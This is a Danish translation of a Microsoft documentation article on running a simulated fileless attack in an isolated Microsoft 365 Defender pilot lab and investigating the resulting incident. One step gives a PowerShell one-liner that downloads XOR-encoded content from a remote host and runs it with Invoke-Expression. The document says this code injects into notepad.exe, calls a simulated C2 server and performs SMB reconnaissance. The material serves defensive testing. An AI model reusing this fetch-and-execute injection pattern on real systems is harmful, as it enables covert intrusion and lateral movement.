---
title: Kør en simulering af angreb i et Microsoft 365 Defender pilotmiljø
description: Kør simuleringer af angreb for Microsoft 365 Defender for at se, hvordan beskeder og hændelser præsenteres, indsigt opnås, og trusler afhjælpes hurtigt.
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dansimp
author: dansimp
ms.date: 07/09/2021
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
- zerotrust-solution
ms.custom: admindeeplinkDEFENDER
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: 2fd9dc7e8d597890e8d07ce783938bc1d69b6c78
ms.sourcegitcommit: 61b22df76e0f81e5ef11c587b129287886151c79
ms.translationtype: MT
ms.contentlocale: da-DK
ms.lasthandoff: 07/12/2022
ms.locfileid: "66748753"
---
# <a name="run-an-attack-simulation-in-a-microsoft-365-defender-pilot-environment"></a>Kør en simulering af angreb i et Microsoft 365 Defender pilotmiljø


Denne artikel er [trin 1 af 2](eval-defender-investigate-respond.md) i processen med at udføre en undersøgelse og svar på en hændelse i Microsoft 365 Defender ved hjælp af et pilotmiljø. Du kan få flere oplysninger om denne proces i [](eval-defender-investigate-respond.md) oversigtsartiklen.

Når du har forberedt [dit pilotmiljø](eval-defender-investigate-respond.md), er det tid til at teste Microsoft 365 Defender hændelsessvar og automatiserede undersøgelses- og afhjælpningsfunktioner ved at oprette en hændelse med et simuleret angreb og bruge Microsoft 365 Defender-portalen til at undersøge og reagere.

En hændelse i Microsoft 365 Defender er en samling af korrelerede beskeder og tilknyttede data, der udgør historien om et angreb.

Microsoft 365-tjenester og -apps opretter beskeder, når de registrerer en mistænkelig eller skadelig hændelse eller aktivitet. Individuelle beskeder giver værdifulde fingerpeg om et fuldført eller igangværende angreb. Angreb anvender dog typisk forskellige teknikker mod forskellige typer enheder, f.eks. enheder, brugere og postkasser. Resultatet er flere beskeder for flere enheder i din lejer.

>[!Note]
>Hvis du er helt ny inden for sikkerhedsanalyse og svar på hændelser, kan du se [gennemgangen Besvar din første hændelse](first-incident-overview.md) for at få en guidet præsentation af en typisk proces med analyse, afhjælpning og gennemgang efter hændelser.
>

## <a name="simulate-attacks-with-the-microsoft-365-defender-portal"></a>Simuler angreb med Microsoft 365 Defender-portalen

Portalen Microsoft 365 Defender har indbyggede funktioner til at oprette simulerede angreb på dit pilotmiljø:

- Træning af simulering af angreb for Microsoft 365 Defender til Office 365 på [https://security.microsoft.com/attacksimulator](https://security.microsoft.com/attacksimulator).
  
  På Microsoft 365 Defender-portalen skal du vælge **Mail & samarbejde > oplæring i simulering af angreb**.

- Selvstudier om angreb & simuleringer for Microsoft 365 Defender for Slutpunkt på [https://security.microsoft.com/tutorials/simulations](https://security.microsoft.com/tutorials/simulations).

  På <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">Microsoft 365 Defender-portalen</a> skal du vælge **Slutpunkter > Selvstudier & simuleringer**.

### <a name="defender-for-office-365-attack-simulation-training"></a>Defender for Office 365 træning til simulering af angreb

Defender for Office 365 med Microsoft 365 E5 eller Microsoft Defender for Office 365 Plan 2 omfatter oplæring i simulering af angreb i forbindelse med phishing-angreb. De grundlæggende trin er:

1. Opret en simulering

   Hvis du vil have en trinvis vejledning i, hvordan du opretter og starter en ny simulering, skal du se [Simuler et phishing-angreb](/microsoft-365/security/office-365-security/attack-simulation-training).

2. Opret en nyttedata

   Hvis du vil have en trinvis vejledning i, hvordan du opretter en nyttedata til brug i en simulering, skal du se [Opret en brugerdefineret nyttedata til oplæring af angrebssimulering](/microsoft-365/security/office-365-security/attack-simulation-training-payloads).

3. Få indsigt

   Hvis du vil have en trinvis vejledning i, hvordan du får indsigt i rapportering, skal du se [Få indsigt via oplæring i simulering af angreb](/microsoft-365/security/office-365-security/attack-simulation-training-insights).

   > [!VIDEO https://www.microsoft.com/videoplayer/embed/RWMhvB]

Du kan få flere oplysninger under [Simuleringer](/microsoft-365/security/office-365-security/attack-simulation-training-get-started#simulations).

### <a name="defender-for-endpoint-attack-tutorials--simulations"></a>Selvstudier om Defender for Endpoint-angreb & simuleringer

Her er Defender for Endpoint-simuleringer fra Microsoft:

- Dokumentet falder bagdør
- Automatiseret undersøgelse (bagdør)

Der er yderligere simuleringer fra tredjepartskilder. Der er også et sæt selvstudier.

For hver simulering eller hvert selvstudium:

1. Download og læs det tilsvarende gennemgangsdokument, der er angivet.

2. Download simuleringsfilen. Du kan vælge at downloade filen eller scriptet på testenheden, men det er ikke obligatorisk.

3. Kør simuleringsfilen eller scriptet på testenheden som beskrevet i gennemgangsdokumentet.

 Du kan få flere oplysninger under [Erfaring Microsoft Defender for Endpoint gennem simuleret angreb](/microsoft-365/security/defender-endpoint/attack-simulations).

## <a name="simulate-an-attack-with-an-isolated-domain-controller-and-client-device-optional"></a>Simuler et angreb med en isoleret domænecontroller og klientenhed (valgfrit)

I denne valgfri øvelse for svar på hændelser skal du simulere et angreb på en domænecontroller med et isoleret Active Directory-domæneservices (AD DS) og en Windows-enhed ved hjælp af et PowerShell-script og derefter undersøge, afhjælpe og løse hændelsen.

Først skal du føje slutpunkter til dit pilotmiljø.

### <a name="add-pilot-environment-endpoints"></a>Tilføj slutpunkter for pilotmiljø

Først skal du føje en isoleret AD DS-domænecontroller og en Windows-enhed til dit pilotmiljø.

1. Kontrollér, at lejeren til pilotmiljøet har [aktiveret Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).

2. Bekræft, at domænecontrolleren:

   - Kører Windows Server 2008 R2 eller en nyere version.
   - Rapporter til [Microsoft Defender for Identity](/azure/security-center/security-center-wdatp) og har aktiveret [fjernadministration](/windows-server/administration/server-manager/configure-remote-management-in-server-manager).
   - Er [integration af Microsoft Defender for Identity og Microsoft Defender for Cloud Apps](/cloud-app-security/mdi-integration) aktiveret.
   - Har en testbruger oprettes i testdomænet. Tilladelser på administratorniveau er ikke nødvendige.

3. Kontrollér, at din testenhed:

   - Kører Windows 10 version 1903 eller en nyere version.
   - Er tilsluttet AD DS-domænecontrollerdomænet.
   - Har [Windows Defender Antivirus](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features) aktiveret. Hvis du har problemer med at aktivere Windows Defender Antivirus, kan du se dette [emne om fejlfinding](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-microsoft-defender-antivirus-is-not-disabled-by-a-policy).
   - Er [onboardet til Microsoft Defender for Endpoint](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).

Hvis du bruger lejer- og enhedsgrupper, skal du oprette en dedikeret enhedsgruppe for testenheden og pushe den til øverste niveau.

Et alternativ er at hoste din AD DS-domænecontroller og teste enheden som virtuelle maskiner i Microsoft Azure-infrastrukturtjenester. Du kan bruge instruktionerne i [fase 1 i den simulerede vejledning til virksomhedstestlaboratorier](/microsoft-365/enterprise/simulated-ent-base-configuration-microsoft-365-enterprise#phase-1-create-a-simulated-intranet), men springe oprettelsen af den virtuelle APP1-maskine over.

Her er resultatet.

:::image type="content" source="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png" alt-text="Evalueringsmiljøet ved hjælp af den simulerede vejledning til virksomhedstestlaboratorier" lightbox="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png":::

Du simulerer et avanceret angreb, der bruger avancerede teknikker til at skjule sig fra registrering. Angrebet optæller åbne SMB-sessioner (Server Message Block) på domænecontrollere og henter de seneste IP-adresser på brugernes enheder. Denne kategori af angreb omfatter normalt ikke filer, der er droppet på offerets enhed, og de forekommer udelukkende i hukommelsen. De "lever af jorden" ved hjælp af eksisterende system- og administrative værktøjer og indsætter deres kode i systemprocesser for at skjule deres udførelse. En sådan funktionsmåde giver dem mulighed for at undgå registrering og bevare på enheden.

I denne simulering starter vores eksempelscenarie med et PowerShell-script. I den virkelige verden kan en bruger blive narret til at køre et script, eller scriptet kan køre fra en fjernforbindelse til en anden computer fra en tidligere inficeret enhed, hvilket indikerer, at hackeren forsøger at flytte lateralt i netværket. Det kan være svært at registrere disse scripts, fordi administratorer også ofte kører scripts eksternt for at udføre forskellige administrative aktiviteter.

:::image type="content" source="../../media/mtp/mtpdiydiagram.png" alt-text="Fileless PowerShell-angrebet med procesinjektion og SMB-rekognosceringsangreb" lightbox="../../media/mtp/mtpdiydiagram.png":::

Under simuleringen, sprøjter angrebet shellcode ind i en tilsyneladende uskyldig proces. Scenariet kræver brug af notepad.exe. Vi har valgt denne proces til simulering, men personer med ondsindede hensigter vil med større sandsynlighed målrette en systemproces, der har kørt i lang tid, f.eks. svchost.exe. Shellcode fortsætter derefter med at kontakte hackerens C2-server (command-and-control) for at få instruktioner i, hvordan du fortsætter. Scriptet forsøger at udføre rekognosceringsforespørgsler mod domænecontrolleren (DC). Rekognoscering gør det muligt for en hacker at få oplysninger om de seneste brugerlogonoplysninger. Når personer med ondsindede hensigter har disse oplysninger, kan de flytte side om side i netværket for at få adgang til en bestemt følsom konto

> [!IMPORTANT]
> Hvis du vil opnå optimale resultater, skal du følge instruktionerne til simulering af angreb så tæt som muligt.

### <a name="run-the-isolated-ad-ds-domain-controller-attack-simulation"></a>Kør simulering af det isolerede AD DS-domænecontrollerangreb

Sådan kører du simulering af angrebsscenarie:

1. Sørg for, at dit pilotmiljø indeholder den isolerede AD DS-domænecontroller og Windows-enhed.

2. Log på testenheden med testbrugerkontoen.

3. Åbn et Windows PowerShell vindue på testenheden.

4. Kopiér følgende simuleringsscript:

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > Hvis du åbner denne artikel i en webbrowser, kan du støde på problemer med at kopiere hele teksten uden at miste visse tegn eller introducere ekstra linjeskift. Hvis det er tilfældet, skal du downloade dette dokument og åbne det på Adobe Reader.

5. Indsæt og kør det kopierede script i PowerShell-vinduet.

> [!NOTE]
> Hvis du kører PowerShell ved hjælp af RDP-protokollen (Remote Desktop Protocol), skal du bruge kommandoen Skriv udklipsholdertekst i **RDP-klienten, fordi ctrl-v-genvejstasten** eller metoden højreklik og sæt ind muligvis ikke virker. De seneste versioner af PowerShell accepterer heller ikke denne metode. Det kan være nødvendigt at kopiere til Notesblok i hukommelsen først, kopiere den i den virtuelle maskine og derefter indsætte den i PowerShell.

Nogle få sekunder senere åbnes appen Notesblok. En simuleret angrebskode sprøjtes ind i Notesblok. Hold den automatisk genererede forekomst af Notesblok åben for at opleve hele scenariet.

Den simulerede angrebskode forsøger at kommunikere til en ekstern IP-adresse (simuleret C2-serveren) og forsøger derefter at rekognoscere mod domænecontrolleren via SMB.

Du får vist denne meddelelse i PowerShell-konsollen, når scriptet er fuldført:

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

Hvis du vil se funktionen Automatiseret hændelse og svar i aktion, skal du holde processen notepad.exe åben. Du kan se, at automatiseret hændelse og svar stopper Notesblokprocessen.

### <a name="investigate-the-incident-for-the-simulated-attack"></a>Undersøg hændelsen for det simulerede angreb

> [!NOTE]
> Før vi fører dig gennem denne simulering, kan du se følgende video for at se, hvordan hændelsesstyring hjælper dig med at samle de relaterede beskeder som en del af undersøgelsesprocessen, hvor du kan finde den på portalen, og hvordan den kan hjælpe dig i dine sikkerhedshandlinger:

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

Hvis du skifter til SOC-analytikerens synspunkt, kan du nu begynde at undersøge angrebet på Microsoft 365 Defender portalen.

1. Åbn <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">Microsoft 365 Defender-portalen</a>.

2. Vælg **Hændelser & Beskeder > Hændelser i** navigationsruden.

3. Den nye hændelse for det simulerede angreb vises i hændelseskøen.

   :::image type="content" source="../../media/mtp/fig2.png" alt-text="Et eksempel på køen Hændelser" lightbox="../../media/mtp/fig2.png":::

#### <a name="investigate-the-attack-as-a-single-incident"></a>Undersøg angrebet som en enkelt hændelse

Microsoft 365 Defender korrelerer analyser og samler alle relaterede beskeder og undersøgelser fra forskellige produkter til én hændelsesenhed. Ved at gøre det viser Microsoft 365 Defender en bredere angrebshistorie, der gør det muligt for SOC-analytikeren at forstå og reagere på komplekse trusler.

De beskeder, der genereres under denne simulering, er knyttet til den samme trussel og samles derfor automatisk som en enkelt hændelse.

Sådan får du vist hændelsen:

1. Åbn <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">Microsoft 365 Defender-portalen</a>.

2. Vælg **Hændelser & Beskeder > Hændelser i** navigationsruden.

3. Vælg det nyeste element ved at klikke på cirklen til venstre for hændelsesnavnet. Et sidepanel viser yderligere oplysninger om hændelsen, herunder alle relaterede beskeder. Hver hændelse har et entydigt navn, der beskriver den på baggrund af attributterne for de beskeder, den indeholder.

   De beskeder, der vises i dashboardet, kan filtreres på baggrund af tjenesteressourcer: Microsoft Defender for Identity, Microsoft Defender for Cloud Apps, Microsoft Defender for Endpoint, Microsoft 365 Defender og Microsoft Defender for Office 365.

3. Vælg **Åbn hændelsesside** for at få flere oplysninger om hændelsen.

   På siden **Hændelse** kan du se alle de beskeder og oplysninger, der er relateret til hændelsen. Oplysningerne omfatter de objekter og aktiver, der er involveret i beskeden, registreringskilden for beskederne (f.eks. Microsoft Defender for Identity eller Microsoft Defender for Endpoint) og årsagen til, at de blev sammenkædet. Gennemgang af hændelsesadvarselslisten viser forløbet af angrebet. I denne visning kan du se og undersøge de enkelte beskeder.

   Du kan også klikke på **Administrer hændelse** i menuen til højre for at mærke hændelsen, tildele den til dig selv og tilføje kommentarer.

#### <a name="review-generated-alerts"></a>Gennemse genererede beskeder

Lad os se på nogle af de beskeder, der genereres under det simulerede angreb.

> [!NOTE]
> Vi gennemgår kun nogle få af de beskeder, der genereres under det simulerede angreb. Afhængigt af versionen af Windows og de Microsoft 365 Defender produkter, der kører på din testenhed, kan du se flere beskeder, der vises i en lidt anden rækkefølge.

:::image type="content" source="../../media/mtp/fig6.png" alt-text="Et eksempel på en genereret besked" lightbox="../../media/mtp/fig6.png":::

##### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint"></a>Advarsel: Mistænkelig procesinjektion blev observeret (kilde: Microsoft Defender for Endpoint)

Avancerede hackere bruger avancerede og stealthy metoder til at bevare hukommelsen og skjule sig fra registreringsværktøjer. En almindelig teknik er at arbejde inde fra en systemproces, der er tillid til, i stedet for en skadelig eksekverbar fil, hvilket gør det svært for registreringsværktøjer og sikkerhedshandlinger at spotte den skadelige kode.

For at give SOC-analytikerne mulighed for at fange disse avancerede angreb kan sensorer i dyb hukommelse i Microsoft Defender for Endpoint give vores cloudtjeneste et hidtil uset indblik i en række tværgående kodeinjektionsteknikker. Følgende figur viser, hvordan Defender for Endpoint registrerede og advarede om forsøget på at indsætte kode til <i>notepad.exe</i>.

:::image type="content" source="../../media/mtp/fig7.png" alt-text="Et eksempel på beskeden om indsprøjting af potentielt skadelig kode" lightbox="../../media/mtp/fig7.png":::

##### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint"></a>Advarsel: Uventet funktionsmåde, der blev observeret af en proceskørsel uden kommandolinjeargumenter (Kilde: Microsoft Defender for Endpoint)

Microsoft Defender for Endpoint opdagelser er ofte rettet mod den mest almindelige attribut for en angrebsteknik. Denne metode sikrer holdbarhed og hæver stregen for hackere for at skifte til nyere taktik.

Vi anvender læringsalgoritmer i stor skala til at etablere den normale adfærd for almindelige processer i en organisation og verden over og holde øje med, hvornår disse processer viser unormal adfærd. Disse unormale funktionsmåder indikerer ofte, at der blev introduceret uvigtigt kode, og at den kører i en proces, der ellers er tillid til.

I dette scenarie udviser den proces, <i>notepad.exe</i> , unormal adfærd, der involverer kommunikation med en ekstern placering. Dette resultat er uafhængigt af den specifikke metode, der bruges til at introducere og udføre den skadelige kode.

> [!NOTE]
> Da denne besked er baseret på modeller til maskinel indlæring, der kræver yderligere backendbehandling, kan det tage et stykke tid, før du får vist denne besked på portalen.

Bemærk, at oplysningerne om beskeden omfatter den eksterne IP-adresse – en indikator, som du kan bruge som pivot til at udvide undersøgelsen.

Vælg IP-adressen i beskedprocestræet for at få vist siden med oplysninger om IP-adresse.

:::image type="content" source="../../media/mtp/fig8.png" alt-text="Et eksempel på uventet funktionsmåde af en proces, der kører uden kommandolinjeargumenter" lightbox="../../media/mtp/fig8.png":::

På følgende figur vises den valgte side med oplysninger om IP-adresse (der klikkes på IP-adressen i træet med beskedprocessen).

:::image type="content" source="../../media/mtp/fig9.png" alt-text="Et eksempel på siden med oplysninger om IP-adresse" lightbox="../../media/mtp/fig9.png":::

##### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a>Advarsel: SMB (User and IP address reconnaissance) (Kilde: Microsoft Defender for Identity)

Optælling ved hjælp af SMB-protokollen (Server Message Block) gør det muligt for hackere at få de seneste brugerlogonoplysninger, der hjælper dem med at flytte tværgående gennem netværket for at få adgang til en bestemt følsom konto.

I denne registrering udløses en besked, når optællingen af SMB-sessionen kører mod en domænecontroller.

:::image type="content" source="../../media/mtp/fig10.png" alt-text="Et eksempel på Microsoft Defender for Identity besked om rekognoscering af bruger- og IP-adresse" lightbox="../../media/mtp/fig10.png":::

#### <a name="review-the-device-timeline-with-microsoft-defender-for-endpoint"></a>Gennemse enhedens tidslinje med Microsoft Defender for Endpoint

Når du har udforsket de forskellige beskeder i denne hændelse, skal du navigere tilbage til den hændelsesside, du undersøgte tidligere. Vælg fanen **Enheder** på hændelsessiden for at gennemse de enheder, der er involveret i denne hændelse, som rapporteret af Microsoft Defender for Endpoint og Microsoft Defender for Identity.

Vælg navnet på den enhed, hvor angrebet blev udført, for at åbne enhedssiden for den pågældende enhed. På denne side kan du se beskeder, der blev udløst, og relaterede hændelser.

Vælg fanen **Tidslinje** for at åbne enhedens tidslinje og få vist alle hændelser og funktionsmåder, der er observeret på enheden i kronologisk rækkefølge, og som er afbrudt af de udløste beskeder.

:::image type="content" source="../../media/mtp/fig11.png" alt-text="Et eksempel på enhedens tidslinje med funktionsmåder" lightbox="../../media/mtp/fig11.png":::

Hvis du udvider nogle af de mere interessante funktionsmåder, får du nyttige oplysninger, f.eks. procestræer.

Rul f.eks. ned, indtil du finder beskedhændelsen **Mistænkelig procesinjektion observeret**. Vælg den **powershell.exe, der blev injiceret til notepad.exe proceshændelse** under den, for at få vist hele procestræet for denne funktionsmåde under grafen **Hændelsesenheder** i sideruden. Brug søgelinjen til filtrering, hvis det er nødvendigt.

:::image type="content" source="../../media/mtp/fig12.png" alt-text="Et eksempel på procestræet for den valgte funktionsmåde for oprettelse af PowerShell-filer" lightbox="../../media/mtp/fig12.png":::

#### <a name="review-the-user-information-with-microsoft-defender-for-cloud-apps"></a>Gennemse brugeroplysningerne med Microsoft Defender for Cloud Apps

På hændelsessiden skal du vælge fanen **Brugere** for at få vist listen over brugere, der er involveret i angrebet. Tabellen indeholder yderligere oplysninger om hver bruger, herunder hver brugers score for **undersøgelsesprioritet** .

Vælg brugernavnet for at åbne brugerens profilside, hvor der kan foretages yderligere undersøgelser. [Læs mere om undersøgelse af risikable brugere](/cloud-app-security/tutorial-ueba#identify).

:::image type="content" source="../../media/mtp/fig13.png" alt-text="Brugersiden Defender for Cloud Apps" lightbox="../../media/mtp/fig13.png":::

#### <a name="automated-investigation-and-remediation"></a>Automatiseret undersøgelse og afhjælpning

> [!NOTE]
>Før vi gennemgår denne simulering, kan du se følgende video for at blive fortrolig med, hvad automatiseret selvhelbredelse er, hvor du finder den på portalen, og hvordan den kan hjælpe i dine sikkerhedshandlinger:

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

Gå tilbage til hændelsen på Microsoft 365 Defender-portalen. Fanen **Undersøgelser** på siden **Hændelse** viser de automatiserede undersøgelser, der blev udløst af Microsoft Defender for Identity og Microsoft Defender for Endpoint. Skærmbilledet nedenfor viser kun den automatiserede undersøgelse, der udløses af Defender for Endpoint. Som standard afhjælper Defender for Endpoint automatisk de artefakter, der blev fundet i køen, hvilket kræver afhjælpning.

:::image type="content" source="../../media/mtp/fig14.png" alt-text="Et eksempel på de automatiserede undersøgelser, der er relateret til hændelsen" lightbox="../../media/mtp/fig14.png":::

Vælg den besked, der udløste en undersøgelse, for at åbne siden **Undersøgelsesoplysninger** . Du får vist følgende oplysninger:

- En eller flere beskeder, der udløste den automatiserede undersøgelse.
- Påvirkede brugere og enheder. Hvis der findes indikatorer på flere enheder, vises disse ekstra enheder også.
- Liste over beviser. De objekter, der blev fundet og analyseret, f.eks. filer, processer, tjenester, drivere og netværksadresser. Disse enheder analyseres for mulige relationer til beskeden og klassificeres som godartede eller skadelige.
- Der blev fundet trusler. Kendte trusler, der findes under undersøgelsen.

> [!NOTE]
> Den automatiserede undersøgelse kører muligvis stadig, afhængigt af timingen. Vent et par minutter, indtil processen er fuldført, før du indsamler og analyserer beviserne og gennemser resultaterne. Opdater siden **Undersøgelsesoplysninger** for at få de seneste resultater.

:::image type="content" source="../../media/mtp/fig15.png" alt-text="Et eksempel på siden Med oplysninger om undersøgelse" lightbox="../../media/mtp/fig15.png":::

Under den automatiserede undersøgelse identificerede Microsoft Defender for Endpoint den notepad.exe proces, der blev indsprøjtet som en af de artefakter, der krævede afhjælpning. Defender for Endpoint stopper automatisk den mistænkelige procesinjektion som en del af den automatiserede afhjælpning.

Du kan se <i>notepad.exe</i> forsvinder fra listen over kørende processer på testenheden.

#### <a name="resolve-the-incident"></a>Løs hændelsen

Når undersøgelsen er fuldført og bekræftet for at blive afhjælpet, løser du hændelsen.

På siden **Hændelse** skal du vælge **Administrer hændelse**. Angiv status til **Løs hændelse,** og vælg **Sand besked** for klassificerings **- og sikkerhedstest** til bestemmelse.

:::image type="content" source="../../media/mtp/fig16.png" alt-text="Et eksempel på hændelsessiden med det åbne panel Administrer hændelse, hvor du kan klikke på kontakten for at løse problemet" lightbox="../../media/mtp/fig16.png":::

Når hændelsen er løst, løses alle de tilknyttede beskeder på Microsoft 365 Defender-portalen og de relaterede portaler.

Dette afslutter simuleringer af angreb til analyse af hændelser, automatiseret undersøgelse og løsning af hændelser.

## <a name="next-step"></a>Næste trin

[:::image type="content" source="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png" alt-text="Funktionerne Microsoft 365 Defender svar på hændelser" lightbox="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png":::](eval-defender-investigate-respond-additional.md)

Trin 2 af 2: [Prøv Microsoft 365 Defender funktioner til svar på hændelser](eval-defender-investigate-respond-additional.md)

### <a name="navigation-you-may-need"></a>Navigation, du muligvis har brug for

[Opret det Microsoft 365 Defender evalueringsmiljø](eval-create-eval-environment.md)
